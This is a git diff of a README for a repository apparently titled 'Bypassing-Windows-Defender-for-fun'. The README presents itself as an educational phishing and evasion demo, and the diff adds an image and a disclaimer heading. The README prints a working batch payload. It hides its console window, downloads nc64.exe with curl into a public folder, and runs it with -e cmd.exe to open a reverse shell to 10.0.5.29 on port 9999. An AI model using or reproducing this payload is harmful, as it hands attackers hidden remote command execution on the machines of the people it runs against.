@@ -1,5 +1,8 @@
 # Bypassing-Windows-Defender-for-fun
-Disclaimer:
+![816nvu](https://github.com/S3nouy/Bypassing-Windows-Defender-for-fun/assets/77050462/1b9865a9-73c4-4e63-b1bf-bc5d62f79fa1)
+
+
+# Disclaimer:
 
 This presentation is intended solely for educational purposes to increase awareness about phishing attacks and cybersecurity threats. The techniques demonstrated are to help you recognize and defend against potential threats. By attending this presentation, you acknowledge that any misuse or illegal use of this information is strictly prohibited and is not endorsed. The presenter bears no responsibility for any such misuse.
 
@@ -9,6 +12,7 @@ This presentation is intended solely for educational purposes to increase awaren
 # Introduction:
 In this demo I am taking advantage of simple things, casual softwares intended for ethical use cases and I shape them to be dangerous assets to hack our way in.
 Let’s take a look at the script we are using.
+
 `@echo off
 call getCmdPid
 call windowMode -pid %errorlevel% -mode hidden & curl https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe -o C:\Users\Public\Downloads\nc64.exe & C:\Users\Public\Downloads\nc64.exe -e cmd.exe 10.0.5.29 9999`
